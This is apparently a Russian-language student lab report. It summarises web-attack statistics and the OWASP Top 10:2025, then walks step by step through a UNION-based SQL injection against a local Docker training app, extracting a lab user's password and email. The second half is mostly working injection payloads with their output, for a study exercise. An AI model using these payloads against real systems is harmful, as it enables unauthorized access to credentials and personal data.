### Доля атак через веб-уязвимости

Честно говоря, когда я начала читать отчёты, немного удивилась разбросу цифр. Оказалось, всё дело в том, что каждый источник считает по-своему: одни смотрят только на успешные атаки, другие — на все инциденты, третьи вообще выделяют отдельно веб и инфраструктуру. Поэтому в таблице ниже я добавила колонку с пояснением, что именно измерялось.

| Источник | Выборка | Доля атак через веб-уязвимости | Примечание |
|---|---|---|---|
| Positive Technologies | Глобально, все сектора | 31% успешных атак использовали эксплуатацию уязвимостей | Включает не только веб, но и инфраструктурные уязвимости |
| Solar 4RAYS | РФ, веб-приложения | 82% уязвимостей имели сетевой вектор (HTTP/SSH/SMB) | Рост на 220% в 4 кв. 2025 к 1 кв. |
| Verizon DBIR 2025 | Глобально, 22 тыс. инцидентов | ~40% брешей связаны с веб-приложениями и API | Рост атак через уязвимости по сравнению с 2024 |
| WMX | РФ, онлайн-ресурсы | 1,2 млн веб-атак за 2025 год | Топ-отрасли: финансы, ИТ, ритейл |
| Kaspersky | Глобально | 893 млн фишинговых атак в 2024 (+26% г/г) | Фишинг часто служит вектором для эксплуатации веб-уязвимостей |

Если брать *только успешные атаки на организации*, по данным Positive Technologies эксплуатация уязвимостей (включая веб) используется в 31% случаев, уступая только вредоносному ПО (63%) и социальной инженерии (50%).

Для госсектора РФ доля атак через веб выше — около 21% всех успешных атак приходятся именно на госучреждения, где веб-порталы часто становятся точкой входа.

### Распределение по конкретным уязвимостям (OWASP Top 10:2025)

OWASP обновил свой список в 2025 году, и там есть пара сдвигов по сравнению с предыдущей версией. Меня, например, удивило, что Injection теперь на 5-м месте, а не на первом — раньше это была уязвимость номер один. Зато на первое вышел Broken Access Control, что, в общем-то, логично: всё больше систем строится на API, а контроль доступа там часто настроен небрежно.

| Место | Уязвимость | Краткое описание |
|---|---|---|
| 1 | A01: Broken Access Control | Некорректная проверка прав доступа |
| 2 | A02: Security Misconfiguration | Ошибки в настройке серверов, фреймворков |
| 3 | A03: Software Supply Chain Failures | Уязвимости в сторонних библиотеках |
| 4 | A04: Cryptographic Failures | Слабое шифрование, утечки ключей |
| 5 | A05: Injection | SQLi, XSS, Command Injection |
| 6 | A06: Insecure Design | Архитектурные просчёты на этапе проектирования |
| 7 | A07: Authentication Failures | Слабая аутентификация, брутфорс |
| 8 | A08: Software/Data Integrity Failures | Неверифицируемые обновления, десериализация |
| 9 | A09: Security Logging Failures | Отсутствие мониторинга и алертинга |
| 10 | A10: Mishandling Exceptions | Утечка информации через ошибки |

**Самые популярные цели атак:**

- WordPress и плагины — 11% всех уязвимостей в 4 кв. 2025, более 140 багов за год
- Роутеры и телеком-оборудование — 5%
- AI-сервисы — новый тренд: 24 уязвимости за 2025 год, включая Flowise, Ray, OpenAI Codex

## Часть II. Практика SQL-инъекции

**Задания:**

1. Узнать пароль пользователя с ником **Volk2**
2. Узнать почту пользователя с ником **Vinni-pukh**

Перед тем как начать, я запустила Docker по инструкции и убедилась, что приложение доступно на `localhost:8080`. Дальше — по шагам.

---

### Шаг 1. Базовая проверка приложения

Сначала просто посмотрела, как работает приложение в штатном режиме:

```
http://localhost:8080/task/?id=1
```

Результат:

```
Ваш id: 1
Ваш логин: admin
```

Приложение отвечает, данные по `id` возвращаются. Всё выглядит обычно.

---

### Шаг 2. Проверка на уязвимость SQL-инъекции

Добавляю одиночную кавычку в параметр — классический первый шаг при проверке на SQLi:

```
http://localhost:8080/task/?id=1'
```

Результат:

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
for the right syntax to use near ''1'' LIMIT 0,1' at line 1
```

Приложение выдало необработанную ошибку MySQL прямо в браузер — это уже многое говорит. Значит, параметр `id` подставляется в SQL-запрос напрямую, без экранирования. Можно работать.

---

### Шаг 3. Поиск нужных пользователей по id

Прежде чем лезть в базу через инъекцию, я решила просто перебрать несколько `id`, чтобы найти нужных пользователей — Volk2 и Vinni-pukh:

```
http://localhost:8080/task/?id=3
```

```
Ваш id: 3
Ваш логин: Matroskin
```

```
http://localhost:8080/task/?id=4
```

```
Ваш id: 4
Ваш логин: Vinni-pukh
```

Нашла id для второго задания — **Vinni-pukh имеет id=4**.

```
http://localhost:8080/task/?id=9
```

```
Ваш id: 9
Ваш логин: Volk2
```

Нашла id для первого задания — **Volk2 имеет id=9**.

---

### Шаг 4. Определение количества колонок в запросе

Чтобы использовать `UNION SELECT`, нужно знать, сколько колонок возвращает исходный запрос. Подбираю перебором:

```
http://localhost:8080/task/?id=1' UNION SELECT 1, 2, 3-- 
```

```
Ваш id: 1
Ваш логин: admin
```

Запрос прошёл без ошибки. Пробую 4:

```
http://localhost:8080/task/?id=1' UNION SELECT 1, 2, 3, 4-- 
```

```
The used SELECT statements have a different number of columns
```

**3 колонки — правильное количество.** На 4 получила ошибку.

---

### Шаг 5. Определение отображаемой колонки

Теперь нужно понять, какая из трёх колонок выводится на страницу. Ставлю `id=0` (несуществующий), чтобы исходный запрос вернул пустоту, и заменяю одну из колонок на маркер:

```
http://localhost:8080/task/?id=0' UNION SELECT 1, 99999, 3-- 
```

```
Ваш id: 1
Ваш логин: 99999
```

Вторая колонка отображается на странице как «логин» — через неё и буду вытаскивать данные.

---

### Шаг 6. Извлечение пароля пользователя Volk2

Подставляю поле `password` из таблицы `users` для `id=9`:

```
http://localhost:8080/task/?id=0' UNION SELECT 1, password, 3 FROM users WHERE id=9-- 
```

```
Ваш id: 1
Ваш логин: kjhsd8@j0dfjk3$%jksli
```

**✔ Задание 1 выполнено. Пароль Volk2: `kjhsd8@j0dfjk3$%jksli`**

---

### Шаг 7. Изучение структуры таблицы users

Перед тем как искать почту, я проверила, есть ли вообще колонка `email` в таблице `users`:

```
http://localhost:8080/task/?id=0' UNION SELECT 1, GROUP_CONCAT(column_name), 3
FROM information_schema.columns WHERE table_name='users'-- 
```

```
Ваш id: 1
Ваш логин: USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password
```

Колонок всего три: `id`, `username`, `password`. Email здесь нет — значит, почта хранится где-то в другом месте.

---

### Шаг 8. Получение списка всех таблиц в базе

Смотрю, какие ещё таблицы есть в текущей базе данных:

```
http://localhost:8080/task/?id=0' UNION SELECT 1, GROUP_CONCAT(table_name), 3
FROM information_schema.tables WHERE table_schema=database()-- 
```

```
Ваш id: 1
Ваш логин: emails,users
```

Всего две таблицы: `users` и `emails`. Очевидно, email-адреса лежат в `emails`.

---

### Шаг 9. Изучение структуры таблицы emails

```
http://localhost:8080/task/?id=0' UNION SELECT 1, GROUP_CONCAT(column_name), 3
FROM information_schema.columns WHERE table_name='emails'-- 
```

```
Ваш id: 1
Ваш логин: id,email_id
```

Таблица содержит колонки `id` и `email_id`. Судя по названию, `id` здесь — это тот же id пользователя, что и в таблице `users`.

---

### Шаг 10. Проверка содержимого таблицы emails

Для уверенности сначала смотрю первую запись — хочу убедиться, что в `email_id` действительно лежат адреса:

```
http://localhost:8080/task/?id=0' UNION SELECT 1, email_id, 3 FROM emails-- 
```

```
Ваш id: 1
Ваш логин: admin@otus-lab.com
```

Да, это email администратора. Всё сходится.

---

### Шаг 11. Извлечение почты пользователя Vinni-pukh

Vinni-pukh имеет `id=4` — нашла это ещё на Шаге 3. Запрашиваю email:

```
http://localhost:8080/task/?id=0' UNION SELECT 1, email_id, 3 FROM emails WHERE id=4-- 
```

```
Ваш id: 1
Ваш логин: honey_lover@otus-lab.com
```

**✔ Задание 2 выполнено. Email Vinni-pukh: `honey_lover@otus-lab.com`**
